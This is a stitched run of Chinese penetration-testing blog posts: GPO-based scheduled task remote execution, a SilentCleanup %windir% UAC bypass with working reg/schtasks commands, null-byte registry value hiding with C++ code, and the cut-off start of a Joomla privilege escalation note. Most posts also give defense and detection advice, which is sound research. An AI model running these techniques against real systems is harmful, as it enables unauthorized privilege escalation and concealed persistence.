<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/3-1.png" alt="Alt text"></p>

<p>Id为<code class="language-plaintext highlighter-rouge">28f36a77-298c-4b0a-a1c8-62832fd44cde</code>，对应的文件夹为<code class="language-plaintext highlighter-rouge">{28f36a77-298c-4b0a-a1c8-62832fd44cde}</code></p>

<p>文件夹中的内容如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/3-2.png" alt="Alt text"></p>

<p>文件夹<code class="language-plaintext highlighter-rouge">DomainSysvol</code>中的内容同<code class="language-plaintext highlighter-rouge">\\test.com\SYSVOL\test.com\Policies\{D7DACD95-883C-402F-9238-9E2643F8F309}</code>中的内容保持一致</p>

<p>猜测Backup.xml和gpreport.xml保存有计划任务的注册信息</p>

<p>分别备份测试1和测试2的GPO，对比文件Backup.xml和gpreport.xml</p>

<h4 id="2比较文件">2、比较文件</h4>

<p>文件存在差异，不同的地方就是计划任务的注册信息</p>

<p>对于Backup.xml，不同的位置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/3-3.png" alt="Alt text"></p>

<p>标红的部分就是计划任务的注册信息</p>

<p>对于gpreport.xml，不同的位置如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2018-11-24/3-4.png" alt="Alt text"></p>

<p>标签<code class="language-plaintext highlighter-rouge">&lt;ExtensionData&gt;</code>保存注册信息(未注册不存在此标签)，内容如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>    &lt;ExtensionData&gt;
      &lt;Extension xmlns:q1="http://www.microsoft.com/GroupPolicy/Settings/ScheduledTasks" xsi:type="q1:ScheduledTasksSettings"&gt;
        &lt;q1:ScheduledTasks clsid="{CC63F200-7309-4ba0-B154-A71CD118DBCC}"&gt;
          &lt;q1:ImmediateTaskV2 clsid="{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}" name="debug" image="0" changed="2018-11-11 11:11:11" uid="{C30BC793-8944-4332-97FF-9FDFCAB1191A}" userContext="0" removePolicy="0"&gt;
            &lt;q1:GPOSettingOrder&gt;1&lt;/q1:GPOSettingOrder&gt;
            &lt;q1:Properties action="C" name="debug" runAs="NT AUTHORITY\System" logonType="InteractiveToken"&gt;
              &lt;q1:Task version="1.2"&gt;
                &lt;q1:RegistrationInfo&gt;
                  &lt;q1:Author&gt;TEST\a&lt;/q1:Author&gt;
                  &lt;q1:Description /&gt;
                &lt;/q1:RegistrationInfo&gt;
                &lt;q1:Triggers&gt;
                  &lt;q1:TimeTrigger&gt;
                    &lt;q1:Enabled&gt;true&lt;/q1:Enabled&gt;
                    &lt;q1:StartBoundary&gt;%LocalTimeXmlEx%&lt;/q1:StartBoundary&gt;
                    &lt;q1:EndBoundary&gt;%LocalTimeXmlEx%&lt;/q1:EndBoundary&gt;
                  &lt;/q1:TimeTrigger&gt;
                &lt;/q1:Triggers&gt;
                &lt;q1:Settings&gt;
                  &lt;q1:AllowStartOnDemand&gt;false&lt;/q1:AllowStartOnDemand&gt;
                  &lt;q1:DisallowStartIfOnBatteries&gt;false&lt;/q1:DisallowStartIfOnBatteries&gt;
                  &lt;q1:StopIfGoingOnBatteries&gt;false&lt;/q1:StopIfGoingOnBatteries&gt;
                  &lt;q1:AllowHardTerminate&gt;false&lt;/q1:AllowHardTerminate&gt;
                  &lt;q1:StartWhenAvailable&gt;true&lt;/q1:StartWhenAvailable&gt;
                  &lt;q1:Enabled&gt;true&lt;/q1:Enabled&gt;
                  &lt;q1:Hidden&gt;true&lt;/q1:Hidden&gt;
                  &lt;q1:DeleteExpiredTaskAfter&gt;PT0S&lt;/q1:DeleteExpiredTaskAfter&gt;
                  &lt;q1:MultipleInstancesPolicy&gt;IgnoreNew&lt;/q1:MultipleInstancesPolicy&gt;
                  &lt;q1:Priority&gt;7&lt;/q1:Priority&gt;
                  &lt;q1:ExecutionTimeLimit&gt;PT0S&lt;/q1:ExecutionTimeLimit&gt;
                  &lt;q1:IdleSettings&gt;
                    &lt;q1:Duration&gt;PT5M&lt;/q1:Duration&gt;
                    &lt;q1:WaitTimeout&gt;PT1H&lt;/q1:WaitTimeout&gt;
                    &lt;q1:StopOnIdleEnd&gt;false&lt;/q1:StopOnIdleEnd&gt;
                    &lt;q1:RestartOnIdle&gt;false&lt;/q1:RestartOnIdle&gt;
                  &lt;/q1:IdleSettings&gt;
                &lt;/q1:Settings&gt;
                &lt;q1:Principals&gt;
                  &lt;q1:Principal id="Author"&gt;
                    &lt;q1:UserId&gt;NT AUTHORITY\System&lt;/q1:UserId&gt;
                    &lt;q1:LogonType&gt;InteractiveToken&lt;/q1:LogonType&gt;
                    &lt;q1:RunLevel&gt;HighestAvailable&lt;/q1:RunLevel&gt;
                  &lt;/q1:Principal&gt;
                &lt;/q1:Principals&gt;
                &lt;q1:Actions&gt;
                  &lt;q1:Exec&gt;
                    &lt;q1:Command&gt;powershell&lt;/q1:Command&gt;
                    &lt;q1:Arguments&gt;-c "123 | Out-File C:\test\debug.txt"&lt;/q1:Arguments&gt;
                  &lt;/q1:Exec&gt;
                &lt;/q1:Actions&gt;
              &lt;/q1:Task&gt;
            &lt;/q1:Properties&gt;
            &lt;q1:Filters /&gt;
          &lt;/q1:ImmediateTaskV2&gt;
        &lt;/q1:ScheduledTasks&gt;
      &lt;/Extension&gt;
      &lt;Name&gt;Scheduled Tasks&lt;/Name&gt;
    &lt;/ExtensionData&gt;
</code></pre></div></div>

<p>接下来，通过测试来验证猜测</p>

<h3 id="测试3">测试3</h3>

<h4 id="1创建一个gpo-1">1、创建一个GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>new-gpo -name TestGPO1 | new-gplink -Target "dc=test,dc=com"
</code></pre></div></div>

<h4 id="2备份gpo">2、备份GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Backup-Gpo -Name TestGPO1 -Path C:\test
</code></pre></div></div>

<h4 id="3修改文件backupxml和gpreportxml">3、修改文件Backup.xml和gpreport.xml</h4>

<p>位置：<code class="language-plaintext highlighter-rouge">C:\test\{&lt;Id&gt;}\</code></p>

<p>添加注册信息</p>

<h4 id="4创建scheduledtasksxml">4、创建ScheduledTasks.xml</h4>

<p>位置：<code class="language-plaintext highlighter-rouge">C:\test\{&lt;Id&gt;}\DomainSysvol\GPO\User\Preferences\ScheduledTasks</code></p>

<h4 id="5还原gpo">5、还原GPO</h4>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Import-GPO -Name TestGPO1 -Path C:\test
</code></pre></div></div>

<p>测试成功，，实现计划任务的远程执行</p>

<h2 id="0x04-脚本实现">0x04 脚本实现</h2>
<hr>

<p>流程如下：</p>

<ol>
  <li>备份GPO</li>
  <li>修改文件Backup.xml和gpreport.xml</li>
  <li>创建ScheduledTasks.xml</li>
  <li>还原GPO</li>
</ol>

<p>使用powershell实现，创建ScheduledTasks.xml这部分参考了harmj0y的代码：</p>

<p>https://github.com/PowerShellMafia/PowerSploit/blob/26a0757612e5654b4f792b012ab8f10f95d391c9/Recon/PowerView.ps1#L5907-L6122</p>

<p>我添加了备份GPO，修改文件Backup.xml和gpreport.xml以及还原GPO的功能</p>

<p>需要注意的细节：</p>

<h4 id="1备份gpo时的命令行结果">1、备份GPO时的命令行结果</h4>

<p><code class="language-plaintext highlighter-rouge">Id</code>对应保存的文件夹名称，<code class="language-plaintext highlighter-rouge">GpoId</code>在Backup.xml中会用到</p>

<h4 id="2修改文件backupxml和gpreportxml的方法">2、修改文件Backup.xml和gpreport.xml的方法</h4>

<p>由于添加的内容较多，所以我没有按照xml的格式进行添加</p>

<p>我这里多次使用了replace方法</p>

<p>先定义一个字符串保存注册信息模板，再用replace方法替换对应的属性值</p>

<h4 id="3backupxml中的userextensionguids标签">3、Backup.xml中的<code class="language-plaintext highlighter-rouge">&lt;UserExtensionGuids&gt;</code>标签</h4>

<p>添加计划任务后，标签的值如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;UserExtensionGuids&gt;&lt;![CDATA[[{00000000-0000-0000-0000-000000000000}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}][{AADCED64-746C-4633-A97C-D61349046527}{CAB54552-DEEA-4691-817E-ED4A4D1AFC72}]]]&gt;&lt;/UserExtensionGuids&gt;
</code></pre></div></div>

<p>其中的guid均为固定值</p>

<h4 id="4scheduledtasksxml保存的位置">4、ScheduledTasks.xml保存的位置</h4>

<p>我的脚本使用的位置为<code class="language-plaintext highlighter-rouge">\GPO\User\Preferences\ScheduledTasks</code></p>

<p>也可以使用另一位置<code class="language-plaintext highlighter-rouge">GPO\Machine\Preferences\ScheduledTasks</code></p>

<h4 id="5还原gpo时需要指定id">5、还原Gpo时需要指定Id</h4>

<p>这样能避免当前文件夹存在多个备份文件导致还原失败的问题</p>

<h4 id="6脚本功能">6、脚本功能</h4>

<p>目前该脚本仅支持添加Immediate Task，参照这个脚本的模板可以支持更多的功能</p>

<h4 id="7支持server2008">7、支持Server2008</h4>

<p>Server2008默认Powershell版本为2.0</p>

<p>不支持以下操作：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$content = Get-Content 'C:\test\1.txt'
$content.replace('1','2')
</code></pre></div></div>

<p>解决方法：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$content = [IO.file]::ReadAllText('C:\test\1.txt')
$content.replace('1','2')
</code></pre></div></div>

<h2 id="0x05-小结">0x05 小结</h2>
<hr>

<p>本文详细记录了定位问题和解决问题的过程，介绍了脚本开发的细节，便于读者对脚本做新的改进。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on November 24, 2018
  </div>

  
</article><article class="post">
  <h1>Study Notes of using SilentCleanup to bypass UAC</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>最近我在James Forshaw‏的博客学到了一个Win10下绕过UAC的技巧，该方法通过脚本实现，并且目前微软还未对该绕过方法进行修复（预计在Win10 RS3修复）。经过我的学习测试，该方法同样适用于Win8，并且文中介绍的绕过思路很值得学习，因此整理成文，分享给大家。</p>

<p>文章地址如下：</p>

<p>https://tyranidslair.blogspot.co.uk/2017/05/exploiting-environment-variables-in.html</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>绕过思路</li>
  <li>利用方法</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-绕过思路">0x02 绕过思路</h2>
<hr>

<p>在之前文章也分享过一些绕过UAC思路的心得，可参考以下文章：</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Study-Notes-of-using-sdclt.exe-to-bypass-UAC/</p>

<p>https://3gstudent.github.io/3gstudent.github.io/Study-Notes-Weekly-No.1(Monitor-WMI_ExportsToC++_Use-DiskCleanup-bypass-UAC)/</p>

<p>个人认为寻找绕过UAC的方法可分为以下两个步骤：</p>

<p>1、寻找权限控制不严格的程序</p>

<p>通常具有以下特点：</p>

<ul>
  <li>以普通用户权限启动程序</li>
  <li>程序默认以高权限启动，通常标记为Highest</li>
</ul>

<p>2、该程序启动过程是否可被劫持</p>

<ul>
  <li>启动路径是否可被劫持</li>
  <li>启动过程加载的问题（如dll）是否可被劫持</li>
</ul>

<h2 id="0x03-利用方法">0x03 利用方法</h2>
<hr>

<p>对应到James Forshaw‏的方法，也是优先寻找权限控制不严格的程序——计划任务中的SilentCleanup</p>

<p><strong>注：</strong></p>

<p>Matt Nelson之前也介绍过一个利用SilentCleanup绕过UAC的方法，目前已被修复，文章地址如下：</p>

<p>https://enigma0x3.net/2016/07/22/bypassing-uac-on-windows-10-using-disk-cleanup/</p>

<p><strong>计划任务中的SilentCleanup：</strong></p>

<ul>
  <li>普通用户权限即可启动</li>
  <li>启动后自动提升为高权限</li>
</ul>

<p>通过Powershell可以获取更多细节,代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$task = Get-ScheduledTask SilentCleanup
$task.Principal
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>Win7默认powershell版本2.0，不支持Get-ScheduledTask操作</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/2-1.png" alt="Alt text"></p>

<p>Authenticated Users表示普通用户权限即可启动</p>

<p>RunLevel为Highest表示以高权限启动</p>

<p>查看启动参数，powershell代码如下：</p>

<p><code class="language-plaintext highlighter-rouge">$task.Actions[0]</code></p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/2-2.png" alt="Alt text"></p>

<p>启动参数为<code class="language-plaintext highlighter-rouge">%windir%\system32\cleanmgr.exe</code></p>

<p>这里存在一个可供利用的地方——<code class="language-plaintext highlighter-rouge">环境变量%windir%</code></p>

<p><strong>注：</strong></p>

<p>可通过<code class="language-plaintext highlighter-rouge">set windir</code>查看环境变量%windir%</p>

<p>%windir%默认指向c:\Windows</p>

<p>如果修改当前系统环境变量，指向其他路径，那么这里就实现了一个劫持</p>

<p><strong>例如：</strong></p>

<p>将%windir%设置为c:\test</p>

<p>在c:\test\system32\下将payload.exe保存为cleanmgr.exe</p>

<p>那么在启动计划任务SilentCleanup时，就会以高权限启动payload.exe，实现了UAC绕过</p>

<p><strong>更直接的利用方法：</strong></p>

<p>将%windir%设置为<code class="language-plaintext highlighter-rouge">cmd /K</code>，那么在启动计划任务SilentCleanup时会弹出cmd.exe</p>

<p><strong>注:</strong></p>

<p>cmd后面需要加参数，否则由于参数问题导致无法正常启动</p>

<p>/k表示弹出的cmd.exe在执行代码后不退出</p>

<p>为了增加隐蔽性（很多程序在启动时需要调用环境变量%windir%），在执行cmd的需要同时删除新添加的注册表键值<code class="language-plaintext highlighter-rouge">windir</code>，可以使用如下代码：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>reg add hkcu\Environment /v windir /d "cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM "
schtasks /Run /TN \Microsoft\Windows\DiskCleanup\SilentCleanup /I
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>以上代码来自于https://gist.github.com/tyranid/729b334bf9dc0f38184dbd47ae3f52d0#file-disk_cleanup_uac_bypass-bat</p>

<p>将环境变量设置为<code class="language-plaintext highlighter-rouge">cmd /K reg delete hkcu\Environment /v windir /f &amp;&amp; REM</code>，那么在启动计划任务SilentCleanup时会弹出cmd.exe，接着执行删除注册表键值的命令：<code class="language-plaintext highlighter-rouge">reg delete hkcu\Environment /v windir /f</code></p>

<p>完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/3-1.gif" alt="Alt text"></p>

<p><strong>注:</strong></p>

<p>参数如果换成<code class="language-plaintext highlighter-rouge">/a</code>，那么cmd.exe在执行后面的命令后会立即退出</p>

<h2 id="0x04-防御检测">0x04 防御检测</h2>
<hr>

<h3 id="1防御">1、防御</h3>

<p>修改计划任务SilentCleanup的启动参数，将环境变量去掉，换成<code class="language-plaintext highlighter-rouge">c:\Windows</code>，锁定路径</p>

<p><strong>管理员权限：</strong></p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$action = New-ScheduledTaskAction -Execute $env:windir\System32\cleanmgr.exe -Argument "/autoclean /d $env:systemdrive"
Set-ScheduledTask SilentCleanup -TaskPath \Microsoft\Windows\DiskCleanup -Action $action
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>以上代码来自于https://gist.github.com/tyranid/9ef39228ba0acc6aa4039d2218006546#file-fix_diskclean_uac_bypass-ps1</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/4-1.png" alt="Alt text"></p>

<p>计划任务SilentCleanup的启动参数被修改为<code class="language-plaintext highlighter-rouge">c:\windows\system32\cleanmgr.exe</code>，无法通过修改环境变量%windir%对其劫持</p>

<h3 id="2检测">2、检测</h3>

<p>通过powershell寻找计划任务中是否还存在可供利用的服务，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$tasks = Get-ScheduledTask | 
    Where-Object { $_.Principal.RunLevel -ne "Limited" -and 
                   $_.Principal.LogonType -ne "ServiceAccount" -and 
                   $_.State -ne "Disabled" -and 
                   $_.Actions[0].CimClass.CimClassName -eq "MSFT_TaskExecAction" }
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>以上代码来自于https://gist.github.com/tyranid/92e1c7074a9a7b0d5d021e9218e34fe7#file-get_scheduled_tasks-ps1</p>

<p>如下图，可供利用的服务一共有四个，经测试，其他三个无法实际利用，只有SilentCleanup有效</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/4-2.png" alt="Alt text"></p>

<h2 id="0x05-补充">0x05 补充</h2>
<hr>

<p>该方法同样适用于Win8环境，完整操作如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-5-21/5-1.gif" alt="Alt text"></p>

<p>Win7系统不包含计划任务SilentCleanup，因此无法利用</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>本文介绍了通过计划任务SilentCleanup绕过UAC的方法，该方法仅需要通过脚本向当前用户注册表写入键值即可，简单有效。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on May 21, 2017
  </div>

  
</article><article class="post">
  <h1>渗透技巧——"隐藏"注册表的更多测试</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>在上篇文章<a href="https://3gstudent.github.io/3gstudent.github.io/%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7-%E9%9A%90%E8%97%8F-%E6%B3%A8%E5%86%8C%E8%A1%A8%E7%9A%84%E5%88%9B%E5%BB%BA/">《渗透技巧——”隐藏”注册表的创建》</a>介绍了Poweliks使用过的注册表隐藏技术，分析原理，编写c程序实现功能</p>

<p>本文将做进一步测试，分享一种更为”隐蔽”的方法（该方法暂未找到公开资料，待定）</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>使用Win32 API读取时的错误</li>
  <li>“\0”放在字符串中间的情况</li>
  <li>其他Native API(如NtCreateFile)的应用</li>
  <li>更加隐蔽的利用方法</li>
  <li>防御检测</li>
</ul>

<h2 id="0x02-隐藏原理">0x02 隐藏原理</h2>
<hr>

<p>对于Windows系统，”\0”(即0x0000)会被识别为字符串的结束符</p>

<p>所以在对该字符串读取的过程中，遇到开头的”\0”，会被解析成结束符，提前截断，导致读取错误</p>

<p>而使用Native API设定注册表，需要使用结构体OBJECT_ATTRIBUTES作为参数， 指定读取的字符串长度</p>

<p>只要长度设定正常，就能够读取正确的字符串，避免这个bug</p>

<p><strong>利用的关键：</strong></p>

<p>使用Native API多了一个参数，能够指定读取字符串的长度</p>

<p>那么，对该问题展开进一步思考，就有了如下测试</p>

<h2 id="0x03-使用win32-api读取时具体是什么样的错误">0x03 使用Win32 API读取时，具体是什么样的错误？</h2>
<hr>

<p>使用HiddenNtRegistry创建测试注册表键值，c++调用代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("=================Normal Key=================\n");
printf("1.CreateKey:\n");
MyCreateKey("\\Registry\\Machine\\Software\\test1");
printf("2.OpenKey:\n");
hKey = MyOpenKey("\\Registry\\Machine\\Software\\test1");
printf("3.SetValueKey:\n");
MySetValueKey(hKey,"test1","0123456789abcdef",REG_SZ);

printf("=================Hidden Key=================\n");
printf("1.OpenKey:\n");
hKey = MyOpenKey("\\Registry\\Machine\\Software\\test1");
printf("2.SetHiddenValueKey:\n");
MySetHiddenValueKey(hKey,"\0test1","hidden0123456789abcdef",REG_SZ);
printf("3.QueryHiddenValueKey:\n");
MyQueryHiddenValueKeyString(hKey,"\0test1");
</code></pre></div></div>

<p>程序实现以下功能：</p>

<ul>
  <li>创建注册表键值test1，内容为0123456789abcdef</li>
  <li>创建注册表键值\0test1，内容为hidden0123456789abcdef</li>
</ul>

<p>运行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/2-1.png" alt="Alt text"></p>

<p>使用Win32 API RegQueryValueEx尝试读取以上两个注册表键值</p>

<p>关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>LONG lReturnCode = 0;
HKEY hkey;
LPCTSTR RegPath = _T("Software\\test1");
if (ERROR_SUCCESS == ::RegOpenKeyEx(HKEY_LOCAL_MACHINE, RegPath, 0, KEY_READ, &amp;hkey))
{
	char dwValue[1024];
	DWORD dwSzType = REG_SZ;
	DWORD dwSize = sizeof(dwValue);
	lReturnCode = ::RegQueryValueEx(hkey, _T("test1"), 0, &amp;dwSzType, (LPBYTE)&amp;dwValue, &amp;dwSize);   
	if(lReturnCode != ERROR_SUCCESS)
	{
		printf("lReturnCode:%d\n",lReturnCode);
		if(lReturnCode = 2)
			printf("ERROR_FILE_NOT_FOUND\n");			
			return 0;
		}
		printf("RegQueryValue:");
		for (int i=0;i&lt;dwSize/2-1;i++)
		{
			printf("%c",dwValue[i*2]);
		}
	}
	::RegCloseKey(hkey);
</code></pre></div></div>

<p>读取注册表键值test1，成功获取内容</p>

<p>读取注册表键值\0test1,修改代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>lReturnCode = ::RegQueryValueEx(hkey, _T("\0test1"), 0, &amp;dwSzType, (LPBYTE)&amp;dwValue, &amp;dwSize);
</code></pre></div></div>

<p>读取失败，返回<code class="language-plaintext highlighter-rouge">ERROR_FILE_NOT_FOUND</code></p>

<p>验证上文原理： 由于”\0”的作用，字符串提前被截断，识别为空字符，导致无法获得名称</p>

<p>接着做进一步尝试</p>

<h2 id="0x04-0放在字符串中间会怎样">0x04 “\0”放在字符串中间会怎样？</h2>
<hr>

<p>HiddenNtRegistry的代码为：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>printf("1.OpenKey:\n");
hKey = MyOpenKey("\\Registry\\Machine\\Software\\test2");
printf("2.SetHiddenValueKey:\n");
MySetHiddenValueKey2(hKey,"test2\0abc","hidden0123456789abcdef",REG_SZ);
printf("3.QueryHiddenValueKey:\n");
MyQueryHiddenValueKeyString2(hKey,"test2\0abc");
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>原工程HiddenNtRegistry中的<code class="language-plaintext highlighter-rouge">MySetHiddenValueKey</code>函数和<code class="language-plaintext highlighter-rouge">MyQueryHiddenValueKeyString</code>函数需要作适当修改，重新计算字符串长度，新的函数命名为<code class="language-plaintext highlighter-rouge">MySetHiddenValueKey2</code>和<code class="language-plaintext highlighter-rouge">MyQueryHiddenValueKeyString2</code></p>

<p>程序实现以下功能：</p>

<ul>
  <li>创建注册表键值test2\0abc，内容为hidden0123456789abcdef</li>
  <li>读取注册表键值test2\0abc的内容</li>
</ul>

<p>运行如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/2-2.png" alt="Alt text"></p>

<p>使用regedit.exe查询该键值，弹框提示无法获取，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/2-3.png" alt="Alt text"></p>

<p>这里可以做一个大胆的尝试：</p>

<p><strong>既然test2\0abc中的”\0”会截断字符串，那么我们再创建一个名为test2的键值会怎么样呢？</strong></p>

<p>创建注册表键值test2,内容为0123456789abcdef,关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hKey = MyOpenKey("\\Registry\\Machine\\Software\\test2");
MySetValueKey(hKey,"test2","0123456789abcdef",REG_SZ);
</code></pre></div></div>

<p>再次使用regedit.exe查看注册表，有趣的事情发生了，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/2-4.png" alt="Alt text"></p>

<p>查询注册表键值\Registry\Machine\Software\test2不再弹框报错，而是显示两个名为test2的键值，内容均为0123456789abcdef</p>

<p>我们知道，注册表不允许创建两个名称相同的注册表键值，而上述测试产生的两个同名键值，实际上是因为其中的一个被错误的截断，导致显示键值名称相同，键值内容也相同，为0123456789abcdef(实际上内容为hidden0123456789abcdef)</p>

<p>这样我们就又多了一种”隐藏”注册表的方法，相比于之前的在首位填”\0”，这个隐藏方法最大的优点是使用regedit.exe查看该键值时不会弹框报错，隐蔽效果更好，同时又具有欺骗性，同正常键值内容相同</p>

<p>对比如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/2-5.png" alt="Alt text"></p>

<p>显示键值内容为0123456789abcdef，实际上为hidden0123456789abcdef</p>

<h2 id="0x05-其他native-api如ntcreatefile能否应用">0x05 其他Native API(如NtCreateFile)能否应用？</h2>
<hr>

<p>参考NtCreateKey的实现思路，测试其他Native API，例如NtCreateFile，在创建文件时是否存在相同问题？</p>

<p>使用NtCreateFile创建特殊文件： <code class="language-plaintext highlighter-rouge">\0c:\1\test.txt</code>，关键代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>HMODULE             hModule				= NULL;  
NTCREATEFILE        NtCreateFile		= NULL; 
UNICODE_STRING      FileName			= {0};  
OBJECT_ATTRIBUTES   ObjectAttributes	= {0};  
HANDLE              hFile1				= NULL;  
IO_STATUS_BLOCK     IOsb				= {0};  
HANDLE              hFile2				= INVALID_HANDLE_VALUE;  
PWCHAR              pBuffer				= NULL;  
DWORD               dwRet				= 0;  
hModule = LoadLibrary(_T("ntdll.dll"));  
if (!hModule)     
{  
	printf("Could not GetModuleHandle of NTDLL.DLL");
	return FALSE;
}   
NtCreateFile = (NTCREATEFILE)GetProcAddress(hModule, "NtCreateFile");  
if (!NtCreateFile) 
{
	printf("Could not find NtCreateFile entry point in NTDLL.DLL");
	return FALSE;
}	
char *Path = "\\Device\\\HarddiskVolume1\\1\\test.txt";
char *TempBuff;
TempBuff = (char*)malloc(strlen(Path+2)*2);
for(int i=0;i&lt;strlen(Path);i++)
{
	TempBuff[(i+2)*2] = Path[i];
	TempBuff[(i+2)*2+1] = 0x00;
}
TempBuff[0] = 0x00;
TempBuff[1] = 0x00;
TempBuff[2] = 0x00;
TempBuff[3] = 0x00;
FileName.MaximumLength = MAX_PATH * sizeof(WCHAR);  
FileName.Length = (strlen(Path)+2)*sizeof(WCHAR);  
FileName.Buffer = (WCHAR *)TempBuff;
FileName.Buffer[FileName.Length] = L'\0';
InitializeObjectAttributes(&amp;ObjectAttributes,&amp;FileName,OBJ_CASE_INSENSITIVE,NULL,NULL);
NtStatus = NtCreateFile(&amp;hFile1,  
							FILE_GENERIC_WRITE,  
							&amp;ObjectAttributes,
							&amp;IOsb,  
							NULL,  
							FILE_ATTRIBUTE_NORMAL,  
							0,
							FILE_SUPERSEDE,  
							FILE_SEQUENTIAL_ONLY,
							NULL,  
							0  
							); 
if (!NT_SUCCESS(NtStatus))  
{  
	printf("NtCreateFile failed (%x) \n", NtStatus);            
}  
else  
	printf("NtCreateFile succeed \n"); 
</code></pre></div></div>

<p>返回错误c000003b，表示<code class="language-plaintext highlighter-rouge">STATUS_OBJECT_PATH_SYNTAX_BAD</code></p>

<p>调试程序，跟踪到InitializeObjectAttributes，查看结构体ObjectAttributes的参数，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/3-1.png" alt="Alt text"></p>

<p>查看Buffer在内存中的内容，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-12-8/3-2.png" alt="Alt text"></p>

<p>同NtCreateKey实现时的参数结构相同</p>

<p>对于NtCreateFile，暂时无法应用</p>

<h2 id="0x06-利用思路与检测">0x06 利用思路与检测</h2>
<hr>

<p>Poweliks使用过的注册表隐藏技术，最大的问题是使用regedit.exe打开时会弹框报错，如果将\0插在字符串中间，同时新建一个\0前字符串的同名键值，就能避免这个问题</p>

<p>对此，检测思路就是要找到这种不寻常的注册表键值，查看注册表键值下是否存在两个相同名称的键值</p>

<p>如果利用这种方式在启动项位置新建注册表键值，使用Autoruns是能够检测出来的</p>

<h2 id="0x07-小结">0x07 小结</h2>
<hr>

<p>本文对Poweliks使用过的注册表隐藏技术做了进一步测试，分享一种更为隐蔽的利用方法，同时给出了防御检测的思路，对于其他Native API的应用，还需要更多测试</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on December  8, 2017
  </div>

  
</article><article class="post">
  <h1>Joomla 3.4.4-3.6.3 Account Creation &amp;Privilege Escalation测试记录</h1>

  <div class="entry">
    <h2 id="0x00-简介">0x00 简介</h2>
<hr>

<p>涉及漏洞：</p>

<ul>
  <li>CVE-2016-8869</li>
  <li>CVE-2016-8870</li>
</ul>

<p>利用上述漏洞，攻击者可以注册特权用户</p>

<p><strong>POC:</strong></p>

<p>https://github.com/XiphosResearch/exploits/tree/master/Joomraa</p>

<p>https://www.exploit-db.com/exploits/40637/?rss</p>

<p><strong>分析文章：</strong></p>

<p>http://paper.seebug.org/88/</p>

<p>http://paper.seebug.org/86/</p>

<p><strong>注：</strong></p>

<p>0x01和0x02内容节选自分析文章</p>

<p>http://paper.seebug.org/88/</p>

<p>http://paper.seebug.org/86/</p>

